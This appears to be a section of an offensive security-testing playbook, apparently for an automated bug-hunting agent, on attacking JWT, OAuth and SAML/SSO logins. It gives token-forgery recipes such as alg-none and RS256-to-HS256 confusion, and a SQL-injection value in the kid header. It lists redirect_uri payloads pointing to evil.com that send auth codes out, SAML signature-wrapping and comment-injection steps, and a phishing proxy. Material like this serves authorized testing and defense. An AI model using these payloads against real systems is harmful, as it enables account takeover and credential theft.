# ZDH Phase 7, 31: JWT / OAuth + SAML / SSO Attack Vectors

## Phase 7 - JWT & OAuth Attack Vectors

```python
# Decode any JWT
import base64, json
def b64d(s): return base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4))
header  = json.loads(b64d(token.split('.')[0]))
payload = json.loads(b64d(token.split('.')[1]))

# JWT-specific attacks:
# 1. Algorithm confusion: RS256 -> HS256 (sign with public key as HMAC secret)
# 2. None algorithm: change alg to "none", remove signature
# 3. kid injection: kid=../../dev/null, kid='; SELECT 'x' --
# 4. jku/x5u injection: point to attacker-controlled JWKS
# 5. Role escalation: "roles": ["ROLE_ADMIN"] if payload has role claim
# 6. tenantId manipulation: change to internal tenant
# 7. Embedded PII: private IP in email field (architecture leak)

# OAuth 2.0 attack vectors:
# 1. State parameter CSRF - is state validated? If not, CSRF on login
GET /oauth/authorize?client_id=X&redirect_uri=Y&state=ATTACKER_CONTROLLED

# 2. Redirect URI manipulation
# Try: redirect_uri=https://evil.com (if validation is prefix-only)
# Try: redirect_uri=https://legit.target.com.evil.com
# Try: redirect_uri=https://legit.target.com@evil.com
# Try: redirect_uri=https://legit.target.com/../../evil
# If open redirect exists anywhere on target domain - chain it here

# 3. Token leakage via Referer
# If auth code in URL and page loads external resources -> code in Referer

# 4. Authorization code reuse
# Try submitting same code twice - is it invalidated after first use?

# 5. Client credentials in JS bundle (see Phase 5)
# client_id + client_secret in frontend = can generate tokens as app
```

**RS256 -> HS256 Confusion Attack:**
```python
# 1. Fetch public key: GET /.well-known/jwks.json
# 2. Decode your JWT, check alg=RS256
# 3. Create forged JWT:
#    - Change alg to HS256
#    - Change payload: role=admin, userId=<target_user_id>
#    - Sign with PUBLIC KEY as HMAC secret (the confusion attack)
# 4. Send forged JWT to API
# 5. If accepted: full account takeover / admin access
```

## Phase 31 - SAML & SSO Attack Vectors

```python
# SAML attacks on SSO implementations

# 1. XML Signature Wrapping (XSW)
# SAML response has: <Signature> wraps <Assertion>
# XSW: add SECOND assertion with attacker role, move signature to cover original only
# Server processes the unsigned (attacker-controlled) assertion

# Test: intercept SAML response (base64 in POST parameter)
import base64
saml_b64 = "<from_burp>"
saml_xml = base64.b64decode(saml_b64).decode()
# Look for: <saml:NameID>, <saml:Attribute Name="role">, signature scope

# 2. SAML Comment Injection (CVE-2018-0489 style, still common)
# In NameID field: attacker<!---->@corp.com
# Some parsers strip XML comments -> becomes attacker@corp.com
# If attacker@corp.com exists in SAML response = impersonation

# 3. Signature Exclusion (if signature is optional)
# Remove the <Signature> element entirely
# Some poorly implemented SP do not enforce signature requirement

# 4. SAML Response Replay
# Intercept SAML assertion, submit again from different session
# If no NotOnOrAfter check or Replay protection = session fixation

# 5. IdP Confusion / SP Impersonation
# Craft SAML assertion for your controlled IdP
# Submit to target SP with your IdP's signature
# If SP accepts assertions from any IdP = full account takeover

# Tools:
# saml-raider (Burp extension) - modifies SAML in-flight
# SAMLExtractor (Python) - decodes + analyzes SAML assertions
# evilginx3 - SAML phishing proxy for token theft
```

**Signal:** `emit_signal VULN_CONFIRMED "JWT/SAML: <attack-type> -> account takeover on <target>" "main/zerodayhunt" 0.95`
